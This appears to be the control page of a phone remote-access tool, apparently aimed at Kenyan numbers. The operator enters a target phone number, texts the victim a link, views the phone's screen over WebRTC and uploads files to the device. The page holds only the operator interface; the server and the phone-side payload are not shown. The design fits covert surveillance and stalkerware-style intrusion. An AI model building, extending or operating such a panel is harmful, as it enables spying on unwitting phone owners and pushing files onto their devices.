<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MyLink Ultimate â€¢ Kenya</title>
  <style>
    body { margin:0; background:#0f0f1a; color:#e0e0e0; font-family:Arial; text-align:center; padding:20px; }
    .box { background:#1a1a2e; padding:30px; border-radius:20px; max-width:500px; margin:auto; }
    input, button { width:100%; padding:15px; margin:10px 0; border-radius:12px; border:none; font-size:16px; }
    input { background:#16213e; color:white; }
    button { background:#00ff9d; color:black; font-weight:bold; cursor:pointer; }
    video { width:100%; max-width:600px; border:4px solid #00ff9d; border-radius:16px; margin:20px 0; background:#000; }
  </style>
</head>
<body>
  <div class="box">
    <h1>MyLink Ultimate</h1>
    <input id="num" placeholder="+254712345678 or 0712345678">
    <button onclick="send()">SEND SMS LINK</button>
    <div id="status"></div>

    <h2>Phone Screen</h2>
    <video id="video" autoplay playsinline controls></video>

    <h2>Send Files</h2>
    <input type="file" id="files" multiple>
    <button onclick="upload()">UPLOAD TO PHONE</button>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const video = document.getElementById('video');

    socket.on('offer', async (offer) => {
      const pc = new RTCPeerConnection();
      pc.setRemoteDescription(offer);
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      socket.emit('answer', answer);
      pc.ontrack = e => video.srcObject = e.streams[0];
    });

    async function send() {
      const n = document.getElementById('num').value.trim();
      const res = await fetch(`/link?target=${n}`);
      document.getElementById('status').innerHTML = await res.text();
    }

    function upload() {
      const form = new FormData();
      for (let f of document.getElementById('files').files) form.append('files', f);
      fetch('/upload', { method: 'POST', body: form });
    }
  </script>
</body>
</html>
